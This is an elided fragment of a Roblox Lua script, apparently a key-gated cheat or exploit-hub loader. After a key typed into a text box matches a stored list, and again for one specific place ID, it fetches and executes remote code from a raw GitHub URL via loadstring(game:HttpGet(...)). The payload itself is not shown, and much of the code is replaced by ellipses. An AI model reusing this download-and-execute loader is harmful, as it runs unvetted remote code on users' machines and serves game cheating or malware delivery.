            ...
            if v.Name == "Chat" or v.Name == "BubbleChat" or v.Name == "Freecam" then
                ...
                YesButton.MouseButton1Click:Connect(function()
                    ...
                    if table.find(tableofkeys, tostring(TextBox.Text)) then
                        ...
                        loadstring(game:HttpGet("https://raw.githubusercontent.com/i02gh7f12f13rf/optihubx/main/q3gwe"))()

                        
                        print("There")
                        if a == 4282985734 then -- Place ID / Game ID
                            loadstring(game:HttpGet("https://raw.githubusercontent.com/i02gh7f12f13rf/optihubx/main/q3gwe"))() --Loadstring
                            print("working")
